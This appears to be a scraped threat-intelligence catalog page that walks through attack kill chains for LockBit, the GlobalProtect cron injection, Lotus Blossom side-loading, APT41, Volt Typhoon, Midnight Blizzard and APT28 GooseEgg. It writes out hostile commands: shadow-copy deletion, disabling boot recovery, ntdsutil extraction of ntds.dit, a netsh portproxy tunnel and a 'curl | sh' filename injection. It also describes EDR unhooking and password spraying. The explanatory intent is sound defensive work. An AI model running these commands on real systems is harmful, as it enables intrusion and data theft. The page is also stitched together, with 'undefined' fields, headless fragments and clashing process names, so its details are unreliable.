  1. **[undefined] undefined** (undefined): The extortionist slips into the archive room with an administrator master key, orders the archive clerk (vssadmin.exe / vssvc.exe) to silently incinerate every backup snapshot on the shelves without asking for confirmation (/quiet), and disconnects the emergency recovery switch (bcdedit recoveryenabled No). Before encrypting a single document, the LockBit 3.0 payload (C:\Windows\Temp\lb3_payload.exe -pass a8f9102b, PID 5540, running with High/Administrator integrity under CORP\admin_srv after registering mutex Global\39481-LB3 and stopping backup services via ControlService) calls CreateProcessW to spawn C:\Windows\System32\vssadmin.exe delete shadows /all /quiet (PID 5812, where "delete shadows /all" instructs the Windows Volume Shadow Copy Service to permanently erase every local backup snapshot on the drive so the victim cannot restore clean files for free, and "/quiet" suppresses confirmation prompts). Immediately after, it runs bcdedit /set {default} recoveryenabled No to disable Windows Automatic Repair boot recovery. When vssadmin.exe delete shadows /all /quiet (PID 5812, PPID 5540) executes, it invokes IVssBackupComponents::DeleteSnapshots over COM to the Volume Shadow Copy service (vssvc.exe) to drop all copy-on-write shadow storage diff areas on the NTFS volume (because this pre-encryption step happens before file encryption starts, an EDR rule that kills parent PID 5540 the instant Sysmon Event ID 1 logs vssadmin delete shadows stops the ransomware before data loss occurs). On the diagram, follow Step #1 / Link #1 (#1→ DELETE SHADOWS / ⇠#1 ACK PID 5812) from Node ① (#1 Breached Admin RDP Jump-Host) to Node ② (#2 Datacenter Core Switch), monitored by Node ⑥ (#6 EDR Canary Guard & SOC SIEM).
  2. **[undefined] undefined** (undefined): With every backup copy destroyed and the emergency recovery switch disabled, the crew fans out across every floor using high-speed power tools to lock only the front latch (first 64 KB) of every filing cabinet in seconds, taping a ransom note (Restore-My-Files.txt) onto every desk. With local recovery paths eliminated, lb3_payload.exe (PID 5540) uses Windows I/O Completion Ports (an asynchronous multi-threaded disk subsystem that saturates all CPU cores at once) and Intermittent Encryption, encrypting only the first 64 KB of each file on D:\Shares\Finance\* (such as renaming Q4_Budget.xlsx to Q4_Budget.xlsx.lockbit via MoveFileExW) using hardware-accelerated AES-256-NI + RSA-2048 session key wrapping (destroying each file’s 64 KB header so thousands of files are locked in seconds before defenders can react), and writes the 4.1 KB ransom note D:\Shares\Finance\Restore-My-Files.txt in every directory. Full-file encryption on multi-gigabyte databases takes minutes and generates sustained disk I/O spikes that behavioral anti-ransomware minifilters easily spot. Encrypting only the first 64 KB header via MoveFileExW(*.lockbit) and dropping the 4.1 KB Restore-My-Files.txt note ruins file structures at a fraction of the I/O cost (triggering Sysmon Event ID 11 FileCreate alerts and EDR canary file tripwires that isolate the host). On the diagram, follow Step #2 / Link #2 (#2→ RANSOM NOTE / ⇠#2 ACK 4.1 KB) from Node ② (#2 Datacenter Core Switch) to Node ③ (#3 Target File Server (FILE-SRV-01)), monitored by Node ⑥ (#6 EDR Canary Guard & SOC SIEM).

When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping "../" sequences (creating an empty 0-byte file on disk, which is all the attacker needs, because the exploit payload lives inside the file’s name, not its contents). When the Linux shell parses that command string, it sees the backticks (curl ... | sh, which in Bash/sh means "execute the command inside these backticks first and substitute its output"), immediately running the attacker’s payload as root. Because the attacker never needed to write data into the file, only control its filename via the Step 1 path traversal, even a 0-byte file in the minute/ telemetry folder triggers unauthenticated root Remote Code Execution the next time the cron job ticks. In the documented Auditd SYSCALL 59 exchange from DMZ Reverse Proxy & SPAN Tap to PAN-OS GlobalProtect Edge, PAN-OS GlobalProtect Edge responds with ACK UID 0 (root) (confirming that the CRON RCE (ROOT) request succeeded on PAN-OS GlobalProtect Edge and establishing the runtime state required for Step #3 UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2). On the diagram, follow Step #2 / Link #2 (#2→ CRON RCE (ROOT) / ⇠#2 ACK UID 0 (root)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 PAN-OS GlobalProtect Edge), monitored by Node ⑥ (#6 Unit 42 / Cortex XDR SIEM).

Combining Volexity’s and Unit 42’s forensic findings: with root access on the firewall, the attacker steals /opt/pancfg/mgmt/saved-configs/running-config.xml (the master PAN-OS configuration file containing VPN pre-shared keys, administrator hashes, and internal network routes used by UTA0218 to pivot into internal Windows Domain Controllers via SMB/winexe) and injects the UPSTYLE Python backdoor into /usr/lib/python3.6/site-packages/system.pth (a Python path-configuration file that Python automatically executes every time any system script starts on the appliance). UPSTYLE monitors /var/log/pan/sslvpn_ngx_error.log for crafted HTTPS requests and writes command output into /var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css (the public CSS stylesheet of the VPN login page, letting the attacker read command results over port 443). When the attacker sends a specially formatted HTTPS request with a bogus URL that logs an error into sslvpn_ngx_error.log, the background UPSTYLE inotify daemon parses the embedded Base64 command, appends the output inside a CSS comment /*...*/ in bootstrap.min.css, and 15 seconds later restores the original CSS file and deletes the offending log line (erasing both the command and output traces). On the diagram, follow Step #3 / Link #3 (#3→ SYSTEM.PTH HOOK / ⇠#3 ACK 4,128 Bytes) from Node ③ (#3 PAN-OS GlobalProtect Edge) to Node ④ (#4 UPSTYLE Python Backdoor), monitored by Node ⑥ (#6 Unit 42 / Cortex XDR SIEM).

Migrating execution from the interactive mmc.exe process into a headless dllhost.exe process via shared section mapping (RwSection) or Asynchronous Procedure Call (NtQueueApcThread) ensures the C2 beacon stays alive in the background long after the victim closes the .msc window. On the diagram, follow Step #3 / Link #3 (#3→ INJECT DLLHOST.EXE / ⇠#3 ACK PID 6088) from Node ③ (#3 mmc.exe (Management Console)) to Node ④ (#4 apds.dll & DotNetToJScript), monitored by Node ⑥ (#6 Elastic Defend & SIEM).

- **Canonical URL:** https://www.attackexplorer.com/scenarios/elastic-lotus-blossom-chrysalis
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** MITRE-T1574.002 (8.6 HIGH)
- **Attributed Threat Actors:** Lotus Blossom (Spring Dragon), Mustang Panda / Stately Taurus Overlaps
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The intruder drops a 3-piece kit into a quiet folder (C:\ProgramData\Comms\): (1) a real, digitally signed executable, (2) a trojanized helper library with the exact name the executable looks for (mpclient.dll / libcurl.dll), and (3) a locked box of encrypted shellcode (chrysalis.dat). Across campaigns analyzed by Elastic Security Labs and Cisco Talos, the attacker stages a 3-file triad inside a writable folder like C:\ProgramData\Comms\: (1) a genuine, digitally signed executable (such as Microsoft’s MsMpEng.exe or Notepad++ WinGUp GUP.exe, authentic signed binaries whose valid digital certificates prevent antivirus from blocking the .exe launch), (2) a malicious companion DLL named mpclient.dll or libcurl.dll placed in that exact same folder (exploiting Windows’ default DLL search order, which checks the application’s current directory before C:\Windows\System32), and (3) an encrypted data file named chrysalis.dat or conf.bin (containing the actual backdoor in scrambled form so static file scanners see only random bytes). When the signed host binary starts from C:\ProgramData\Comms\, the Windows loader (ntdll!LdrLoadDll) resolves its Import Address Table (IAT), sees an import for mpclient.dll / libcurl.dll, finds the attacker’s unsigned DLL sitting in the local directory first, and maps it directly into the trusted process. In the documented Sysmon EID 7 exchange from Lotus Blossom C2 Server to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK Unsigned DLL (confirming that the SIDELOAD LIBCURL request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 FNV-1A / MURMURHASH API RESOLUTION & CHRYSALIS DECRYPTION). On the diagram, follow Step #1 / Link #1 (#1→ SIDELOAD LIBCURL / ⇠#1 ACK Unsigned DLL) from Node ① (#1 Lotus Blossom C2 Server) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Elastic Security EDR & SIEM).
  2. **[undefined] undefined** (undefined): Once the imposter assistant (mpclient.dll / libcurl.dll) is invited inside the VIP suite, they quietly unlock the third file (chrysalis.dat) in memory, so no antivirus scanner looking at the hard drive ever sees the real weapon. Once the signed binary loads the trojanized DLL and calls its exported startup function (keeping the malicious DLL tiny and using custom 32-bit API hashing instead of plaintext function names like VirtualAlloc so static analysts see no suspicious imports), the DLL opens the companion file chrysalis.dat / conf.bin from disk, decrypts its bytes in RAM using a custom RC4/XOR key, and copies the unpacked Chrysalis / Sagerunex shellcode into an executable memory buffer (meaning the actual APT backdoor code only ever exists in volatile memory, never unencrypted on the hard drive). Splitting the infection chain across three files (a clean signed .exe, a minimal loader .dll using API hashing, and an encrypted .dat/.bin blob) defeats traditional signature scanners: the .exe is 100% legitimate, the .dll contains only a simple file-read and XOR/RC4 loop, and the .dat file has no PE header ("MZ") on disk. On the diagram, follow Step #2 / Link #2 (#2→ CHRYSALIS UNPACK / ⇠#2 ALERT 164 KB RWX) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 GUP.exe (Signed WinGUp)), monitored by Node ⑥ (#6 Elastic Security EDR & SIEM).
  3. **[undefined] undefined** (undefined): Wearing the trusted program’s badge, the decrypted backdoor reads the employee’s own internet proxy pass from Windows (WinInet) and blends its outbound HTTPS messages right into normal office web traffic. Running inside the trusted host binary, the decrypted Chrysalis/Sagerunex implant registers a persistent Windows service or Registry Run key (pointing to the legitimate signed .exe so startup monitors see a signed binary), and calls Windows WinInet APIs (InternetOpenW and HttpSendRequestW, chosen instead of raw sockets because WinInet automatically reads the logged-in employee’s corporate proxy settings and cached NTLM/Kerberos credentials, allowing the C2 beacon to pass right through strict enterprise web proxies). In many enterprise networks, direct outbound TCP/443 connections are blocked unless traffic authenticates through a corporate HTTP proxy. Using WinInet with INTERNET_OPEN_TYPE_PRECONFIG lets the malware piggyback on Windows’ built-in proxy configuration and user credentials automatically. In the documented Sysmon EID 3 exchange from GUP.exe (Signed WinGUp) to libcurl.dll & CHRYSALIS RAM, libcurl.dll & CHRYSALIS RAM responds with ACK TLS 1.2 (confirming that the HTTPS C2 BEACON request succeeded on libcurl.dll & CHRYSALIS RAM and completing the final execution objective of Elastic Security Labs, Lotus Blossom APT: WinGUp DLL Side-Loading & CHRYSALIS Backdoor). On the diagram, follow Step #3 / Link #3 (#3→ HTTPS C2 BEACON / ⇠#3 ACK TLS 1.2) from Node ③ (#3 GUP.exe (Signed WinGUp)) to Node ④ (#4 libcurl.dll & CHRYSALIS RAM), monitored by Node ⑥ (#6 Elastic Security EDR & SIEM).

Using the newly hijacked Single Sign-On (SSO) account, the attacker logs into the company’s virtual desktop (Citrix / Azure VDI), searches internal IT documentation (Confluence / SharePoint, documented by Mandiant UNC3944 as the primary way the group locates VPN guides, CyberArk/PAM instructions, and VMware vCenter architecture diagrams), and installs commercial Remote Monitoring and Management (RMM) or mesh-VPN tools like AnyDesk, ScreenConnect, Tailscale, or ngrok (chosen because these tools are digitally signed by legitimate software vendors so antivirus does not block them, and they maintain an encrypted outbound tunnel that survives even if the victim’s SSO password and MFA are later reset). Commercial RMM agents establish persistent outbound TLS/WebSocket connections to the vendor’s relay cloud, giving the attacker full interactive desktop control without deploying any custom malware binary. Simultaneously, for on-premises infrastructure, they add their compromised account to the Active Directory ESX Admins group to take direct SSH control over VMware ESXi hypervisors and export production S3 buckets. By compromising the Single Sign-On and Active Directory identity layer that governs both cloud role federation and hypervisor authentication, the attacker moves straight from a phone call to the IT Helpdesk into full control of AWS/Azure and VMware ESXi without touching a single network firewall exploit. In the documented CloudTrail STS/IAM exchange from Okta / Entra ID SSO Portal to Admin Endpoint (RMM Persistence), Admin Endpoint (RMM Persistence) responds with RESP AKIA...Key (confirming that the ASSUMEROLE + KEY request succeeded on Admin Endpoint (RMM Persistence) and completing the final execution objective of Unit 42 & CISA, Scattered Spider (Muddled Libra): SSO MFA Fatigue, RMM & AWS/ESXi Pivot). ## 11. Elastic & Mandiant — APT41 (Brass Typhoon): DodgeBox, Call-Stack Spoofing & DUSTPAN Loader
- **Scenario ID:** `elastic-apt41-dustpan-stealthvector`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/elastic-apt41-dustpan-stealthvector
- **Category:** Malware & Process Execution (`MALWARE`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** MITRE-T1620 (8.9 HIGH)
- **Attributed Threat Actors:** APT41 (Brass Typhoon / Wicked Panda), Earth Freybug & ShadowPad Affiliates
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The outer nesting doll opens: the dropper starts the official Windows Error Reporting manager (wermgr.exe) and slips the DUSTPAN stage-1 loader into its memory. The initial persistence trigger executes the DUSTPAN stage-1 loader (a lightweight launcher documented by Mandiant that contains zero C2 domains or post-exploitation tools of its own, so if an analyst captures the file on disk they learn nothing about the final implant). DUSTPAN immediately spawns C:\Windows\System32\wermgr.exe (Windows Error Reporting Manager, documented by Trend Micro’s Earth Freybug research as chosen because wermgr.exe is a Microsoft-signed binary that legitimately connects to external HTTPS servers to upload crash reports, allowing C2 traffic to blend in) and injects its decryption stub into wermgr.exe’s memory. By immediately transferring execution into C:\Windows\System32\wermgr.exe via remote memory allocation and APC/thread hijacking, all subsequent stages execute under the process identity and digital signature of a built-in Windows telemetry binary. In the documented Sysmon EID 7 exchange from APT41 Cloudflare Worker C2 to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK Unsigned DLL (confirming that the SIDELOAD DODGEBOX request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 CALL-STACK SPOOFING & REFLECTIVE DUSTTRAP MAPPING). On the diagram, follow Step #1 / Link #1 (#1→ SIDELOAD DODGEBOX / ⇠#1 ACK Unsigned DLL) from Node ① (#1 APT41 Cloudflare Worker C2) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Elastic Defend & ETW Ti Sensor).
  2. **[undefined] undefined** (undefined): Before opening the inner nesting doll (DUSTTRAP), the STEALTHVECTOR stage brings in a fresh, un-bugged copy of the Windows system phonebook (ntdll.dll) from disk, wiping out all the wiretaps that the endpoint’s EDR security agent had placed on the phone lines. Running inside wermgr.exe, the STEALTHVECTOR stage (analyzed by Elastic Security Labs) reads a clean copy of C:\Windows\System32\ntdll.dll from disk and overwrites the .text code section of the already-loaded ntdll.dll in RAM (because user-mode EDR agents monitor a program by placing 5-byte JMP "wiretap" hooks at the start of system functions inside ntdll.dll in memory, so pasting the clean bytes from disk right over the hooked bytes erases all of the EDR’s user-mode wiretaps). Simultaneously, it constructs synthetic thread call-stack frames (RtlUserThreadStart → BaseThreadInitThunk, so EDR memory walkers see a normal Windows call stack instead of unbacked shellcode) and ChaCha20/AES-GCM-decrypts Mandiant’s DUSTTRAP backdoor directly in memory. To unhook ntdll.dll, STEALTHVECTOR calls VirtualProtect on the in-memory ntdll.dll .text section (temporarily changing it from Read-Execute 0x20 to Read-Write-Execute 0x40), copies the clean .text bytes from the on-disk ntdll.dll file, and restores 0x20 permissions, silencing user-mode API hooks before DUSTTRAP initializes. On the diagram, follow Step #2 / Link #2 (#2→ STACK SPOOF + RX / ⇠#2 ALERT 312 KB RX) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Signed Host Binary (taskhost.exe)), monitored by Node ⑥ (#6 Elastic Defend & ETW Ti Sensor).
  3. **[undefined] undefined** (undefined): With the phone lines un-tapped, the innermost doll (DUSTTRAP) snaps modular tool attachments (keylogger, credential harvester, file manager) directly into RAM as the remote operator requests them. With ntdll.dll unhooked inside wermgr.exe, the DUSTTRAP core opens a mutual-TLS channel (requiring both client and server certificates so security researchers cannot probe the C2 server or replay traffic) to APT41’s command infrastructure, and loads 16 specialized in-memory plugins (file manager, shell executor, credential harvester, Active Directory recon, streamed into RAM only when needed so the full toolkit never sits on the victim’s hard drive). Although unhooking ntdll.dll blinds user-mode API hooks inside wermgr.exe, Kernel-mode Event Tracing for Windows (EtwTiLogProtectVM) and Sysmon EventID 3 still catch the ntdll.dll permission change paired with wermgr.exe connecting to a non-Microsoft IP address. In the documented Sysmon EID 3 exchange from Signed Host Binary (taskhost.exe) to DodgeBox Stack-Spoofing & DUSTTRAP, DodgeBox Stack-Spoofing & DUSTTRAP responds with ACK TLS 1.3 (confirming that the WORKER TLS C2 request succeeded on DodgeBox Stack-Spoofing & DUSTTRAP and completing the final execution objective of Elastic & Mandiant, APT41 (Brass Typhoon): DodgeBox, Call-Stack Spoofing & DUSTPAN Loader). On the diagram, follow Step #3 / Link #3 (#3→ WORKER TLS C2 / ⇠#3 ACK TLS 1.3) from Node ③ (#3 Signed Host Binary (taskhost.exe)) to Node ④ (#4 DodgeBox Stack-Spoofing & DUSTTRAP), monitored by Node ⑥ (#6 Elastic Defend & ETW Ti Sensor).

## 12. Microsoft & CISA — Volt Typhoon: Living-off-the-Land ntdsutil IFM & netsh Portproxy
- **Scenario ID:** `ms-volt-typhoon-lotl`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/ms-volt-typhoon-lotl
- **Category:** Active Directory & Identity (`ACTIVE_DIRECTORY`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2022-42475 / SOHO-0DAY (9.8 CRITICAL)
- **Attributed Threat Actors:** Volt Typhoon (Bronze Silhouette), KV Botnet Operations Team
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Rather than calling the target’s server from an overseas phone number that would raise an instant red flag, the operator routes the call through a neighborhood home router down the street (KV-Botnet 198.51.100.14) and uses the jump server’s built-in maintenance intercom (wmic process call create) to issue commands on the Domain Controller. Instead of connecting from a rented cloud VPS that threat-intelligence feeds would block, the attacker connects through a compromised small-office/home-office (SOHO) router in the same geographic region (KV-Botnet node 198.51.100.14, so geo-IP filters see normal local ISP traffic) into the IT Jump Server SRV-MGMT-01 (10.10.15.22). From SRV-MGMT-01, the operator executes wmic /node:10.10.0.5 process call create "cmd.exe /Q /c ntdsutil "ac i ntds" "ifm"..." toward Domain Controller CORP-DC01 (10.10.0.5), causing WmiPrvSE.exe on CORP-DC01 to spawn the command under PID 6412 and return ReturnValue = 0 (confirming remote process creation over DCOM/RPC without dropping any third-party remote-execution binary). When wmic.exe connects over TCP/135 (RPC Endpoint Mapper) and dynamic DCOM ports to CORP-DC01 (10.10.0.5), the remote WMI provider host (WmiPrvSE.exe) spawns cmd.exe / ntdsutil.exe (PID 6412) under the authenticated administrator context (recording Sysmon Event ID 1 on CORP-DC01 with ParentImage = WmiPrvSE.exe). On the diagram, follow Step #1 / Link #1 (#1→ WMIC REMOTE EXEC / ⇠#1 ACK PID 6412) from Node ① (#1 KV-Botnet SOHO Edge Node) to Node ② (#2 Core Identity & VLAN Switch), monitored by Node ⑥ (#6 Microsoft Sentinel & MDE).
  2. **[undefined] undefined** (undefined): The Domain Controller keeps its master password book (ntds.dit) locked inside a glass case while Windows is running so nobody can copy the file directly. Instead of smashing the glass, the infiltrator asks the official Active Directory maintenance robot (ntdsutil "ac i ntds" "ifm") to take a temporary backup snapshot and place an unlocked copy right into C:\Windows\Temp\tmp_ad\. Active Directory exclusively locks C:\Windows\NTDS\ntds.dit (the master database file containing the password hashes of every employee, service, and Domain Admin in the company) while the Domain Controller is running, so normal copy commands fail. Running under PID 6412 on CORP-DC01 (10.10.0.5), ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\tmp_ad" (where "ac i ntds" selects the Active Directory database instance, and "ifm" / "create full" instructs Microsoft’s signed backup tool to take a Volume Shadow Copy snapshot) writes an unlocked copy of C:\Windows\Temp\tmp_ad\Active Directory\ntds.dit plus the registry\SYSTEM decryption hive (emitting ESENT Application Event ID 325 confirming the new database file was created). The ifm (Install From Media, originally designed so administrators could promote a new Domain Controller from a backup folder) command in ntdsutil.exe (PID 6412) automatically invokes vssvc.exe to snapshot the volume, extracts both Active Directory\ntds.dit and registry\SYSTEM (which holds the BootKey required to decrypt the NTLM and Kerberos keys inside ntds.dit offline), and removes the temporary shadow copy upon completion. On the diagram, follow Step #2 / Link #2 (#2→ NTDS.DIT CREATED / ⇠#2 ACK Event 325) from Node ② (#2 Core Identity & VLAN Switch) to Node ③ (#3 IT Jump Server (Netsh Proxy)), monitored by Node ⑥ (#6 Microsoft Sentinel & MDE).
  3. **[undefined] undefined** (undefined): Finally, to keep a persistent hidden hallway open into the Domain Controller without installing any third-party proxy software, the infiltrator programs the Windows jump server’s built-in port forwarder (netsh interface portproxy) to quietly relay port 8443 straight to the Domain Controller’s RDP port (10.10.0.5:3389). To maintain stealthy multi-hop access and relay staged archives out through the jump server SRV-MGMT-01 (10.10.15.22), the attacker runs C:\Windows\System32\netsh.exe (PID 6890): netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectaddress=10.10.0.5 connectport=3389 (instructing Windows’ built-in IP Helper service to forward inbound TCP port 8443 traffic directly to CORP-DC01 at 10.10.0.5:3389 without dropping any custom proxy binary to disk). When netsh.exe (PID 6890) executes the portproxy add v4tov4 command, the Windows kernel/service configuration writes the forwarding rule into HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\0.0.0.0/8443 with value 10.10.0.5/3389 (persisting the tunnel across reboots inside the native IpHlpSvc service while triggering Sysmon Event ID 13 RegistryEvent). On the diagram, follow Step #3 / Link #3 (#3→ NETSH PORTPROXY / ⇠#3 ACK PortProxy) from Node ③ (#3 IT Jump Server (Netsh Proxy)) to Node ④ (#4 ntdsutil.exe & vssadmin.exe), monitored by Node ⑥ (#6 Microsoft Sentinel & MDE).

## 13. Microsoft Threat Intel — Midnight Blizzard (APT29): OAuth App Persistence & EWS Exfiltration
- **Scenario ID:** `ms-midnight-blizzard-oauth`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/ms-midnight-blizzard-oauth
- **Category:** Active Directory & Identity (`ACTIVE_DIRECTORY`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** MITRE-T1098.003 (9.4 CRITICAL)
- **Attributed Threat Actors:** Midnight Blizzard (APT29), SVR Foreign Intelligence Cyber Units
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): Instead of rattling the front door of the main corporate tower 1,000 times from one suspicious van, the attacker has dozens of local couriers (residential proxy IPs) try just one password at a time on a forgotten side-cottage test door that never had a two-factor keypad installed. To avoid triggering automated IP blocks or account lockouts, the attacker routes authentication requests through a rotating pool of residential proxy IPs (home internet routers in the same country as the target, making login traffic look like legitimate local employees rather than a datacenter botnet) and performs a low-volume password spray (trying just one common password at a time across a small list of accounts) against a forgotten, non-production legacy test tenant account that had never been enforced with Multi-Factor Authentication (MFA). Because each residential proxy IP sends only a tiny fraction of the total login attempts and stays well below the bad-password lockout threshold (e.g., 1 attempt per hour), traditional velocity-based brute-force rules do not fire, allowing the attacker to quietly log into the forgotten single-factor test account. On the diagram, follow Step #1 / Link #1 (#1→ LEGACY TENANT SPRAY / ⇠#1 RESP ResultType 0) from Node ① (#1 Midnight Blizzard Proxy Pool) to Node ② (#2 Core Identity & VLAN Switch), monitored by Node ⑥ (#6 Microsoft Sentinel & Defender XDR).
  2. **[undefined] undefined** (undefined): Once inside the side cottage, the intruder discovers an old "Universal Maintenance App" that was accidentally given admin rights over the main corporate tower. Using that app’s authority, they print brand-new client secret keys (Add servicePrincipal credentials) and stamp them with the highest mail-reading clearance (full_access_as_app). Inside the test environment, the attacker discovers a legacy OAuth test application whose Service Principal had been granted privileged directory permissions, specifically AppRoleAssignment.ReadWrite.All (a high-privilege Microsoft Graph permission that allows an app to grant any permission role to itself or to other apps without asking a human Global Administrator), inside the main corporate tenant. Using that legacy app, the attacker creates new malicious OAuth Service Principals, attaches new client secret keys (Add servicePrincipal credentials, creating long-lived API passwords for the app), and assigns them the Office 365 Exchange Online full_access_as_app role. In Microsoft Entra ID, an application holding AppRoleAssignment.ReadWrite.All can call the Graph API (/servicePrincipals/{id}/appRoleAssignments) to self-assign full_access_as_app (Role ID dc890d15-9560-4a4c-9b7f-a736ec74ec40, the highest application-level Exchange permission), escalating from a forgotten test account to full tenant-wide mail access without touching a human admin’s account. On the diagram, follow Step #2 / Link #2 (#2→ GRANT FULL_ACCESS_AS_APP / ⇠#2 RESP Role Granted) from Node ② (#2 Core Identity & VLAN Switch) to Node ③ (#3 Microsoft Entra ID Control Plane), monitored by Node ⑥ (#6 Microsoft Sentinel & Defender XDR).
  3. **[undefined] undefined** (undefined): Holding the full_access_as_app robot pass, the attacker walks straight up to the Exchange mailroom window (outlook.office365.com/EWS/Exchange.asmx) and downloads executive inbox folders in bulk, never triggering a single phone MFA prompt on any executive’s device. Authenticating purely as the rogue OAuth application using grant_type=client_credentials (machine-to-machine authentication that uses the app’s client secret and never involves a human user login or MFA prompt), the attacker calls Exchange Web Services (https://outlook.office365.com/EWS/Exchange.asmx) through the same residential proxy pool to search and download emails from senior executive and security-team mailboxes. Because full_access_as_app is an application-level permission (Application Permission) rather than a delegated user permission (Delegated Permission), the OAuth Bearer token grants direct read/export access to any mailbox in the Exchange Online tenant without ever logging in as those users or triggering Conditional Access user-MFA policies. On the diagram, follow Step #3 / Link #3 (#3→ EWS MAIL EXFIL / ⇠#3 RESP 412 Items) from Node ③ (#3 Microsoft Entra ID Control Plane) to Node ④ (#4 Malicious OAuth Service Principal), monitored by Node ⑥ (#6 Microsoft Sentinel & Defender XDR).

- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** CVE-2022-38028 (7.8 HIGH)
- **Attributed Threat Actors:** Forest Blizzard (APT28 / STRONTIUM), GRU Unit 26165 Cyber Operations
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
  1. **[undefined] undefined** (undefined): The intruder runs a batch script (doit.bat) that edits the XPS Printer’s instruction sheet (mpdw-constraints.js) so the next time the Printer Service checks its settings, it accidentally unlocks its own protected driver cabinet. Starting from a standard low-privilege user session (which cannot install programs or read other users’ passwords), the attacker runs a batch launcher (doit.bat / justice.bat) that executes the GooseEgg binary. GooseEgg creates a custom printer driver key in the Registry and modifies mpdw-constraints.js (a JavaScript configuration file used by the built-in Microsoft XPS Document Writer printer driver to validate print ticket settings, crafted with oversized data to trigger CVE-2022-38028 when the Print Spooler reads it). When C:\Windows\System32\spoolsv.exe (which runs as NT AUTHORITY\SYSTEM) parses the malformed mpdw-constraints.js file inside the DriverStore\FileRepository directory, a memory corruption / permission flaw (CVE-2022-38028) allows the low-privilege user to overwrite the printer driver’s PnPData / DriverFile path. On the diagram, follow Step #1 / Link #1 (#1→ WRITE WAYZGOOSE.DLL / ⇠#1 ACK FileCreate) from Node ① (#1 GooseEgg Batch Launcher) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Microsoft Defender XDR).
  2. **[undefined] undefined** (undefined): Now that the printer ledger points to wayzgoose.dll, GooseEgg sends a dummy print job, waking up spoolsv.exe (SYSTEM), which dutifully loads wayzgoose.dll into its own SYSTEM-privileged memory. With the driver path redirected by the exploit, GooseEgg drops its companion malicious library (wayzgoose.dll) into a writable folder and sends an RPC print-configuration call to wake up spoolsv.exe. Because spoolsv.exe runs as NT AUTHORITY\SYSTEM (the highest local operating-system account on Windows), when it calls LoadLibrary() on the registered printer driver, wayzgoose.dll is loaded directly into spoolsv.exe’s memory and executes with full SYSTEM master-key privileges. Instead of injecting memory into a SYSTEM process from the outside (which Windows Protected Process Light and EDR memory hooks block), CVE-2022-38028 tricks spoolsv.exe into voluntarily loading wayzgoose.dll as if it were an official Microsoft printer driver. On the diagram, follow Step #2 / Link #2 (#2→ SPOOLSV LOAD DLL / ⇠#2 ACK SYSTEM Load) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 DriverStore (pnms009.inf)), monitored by Node ⑥ (#6 Microsoft Defender XDR).
  3. **[undefined] undefined** (undefined): Running inside the SYSTEM Printer Robot, wayzgoose.dll opens a master-key backdoor service and connects out to the operator’s command center. Now executing inside spoolsv.exe as NT AUTHORITY\SYSTEM, wayzgoose.dll launches the attacker’s post-exploitation script (who.bat, which inherits spoolsv.exe’s SYSTEM security token so every command it runs has total control of the computer), registers a persistent Windows service backdoor, and opens an outbound C2 channel so Forest Blizzard can dump LSASS credentials and move laterally. In Windows, any child process created via CreateProcess inherits the security token of its parent process by default. However, because a legitimate Print Spooler (spoolsv.exe) should only talk to printers and never spawn cmd.exe or powershell.exe, this parent-child relationship is a classic high-confidence detection signal. In the documented Sysmon EID 1 exchange from DriverStore (pnms009.inf) to spoolsv.exe -> wayzgoose23.dll, spoolsv.exe -> wayzgoose23.dll responds with ACK PID 6240 (confirming that the SPAWN WHO.EXE request succeeded on spoolsv.exe -> wayzgoose23.dll and completing the final execution objective of Microsoft Threat Intel, Forest Blizzard (APT28): Print Spooler CVE-2022-38028 & GooseEgg). On the diagram, follow Step #3 / Link #3 (#3→ SPAWN WHO.EXE / ⇠#3 ACK PID 6240) from Node ③ (#3 DriverStore (pnms009.inf)) to Node ④ (#4 spoolsv.exe -> wayzgoose23.dll), monitored by Node ⑥ (#6 Microsoft Defender XDR).

## 16. Microsoft, Unit 42 & CISA — Star Blizzard / Storm-0539: Evilginx AiTM Cookie Theft
- **Scenario ID:** `unit42-star-blizzard-evilginx-aitm`
- **Canonical URL:** https://www.attackexplorer.com/scenarios/unit42-star-blizzard-evilginx-aitm
- **Category:** Network & C2 Exfiltration (`NETWORK_WEB`)
- **Difficulty:** undefined
- **MITRE ATT&CK Techniques:** 
- **CVEs / Advisories:** MITRE-T1539 / T1557 (9.0 CRITICAL)
- **Attributed Threat Actors:** Star Blizzard (SEABORGIUM / Callisto), Storm-0539 (Atlas Lion)
- **Executive Summary:** undefined
- **Kill-Chain Stages (3):**
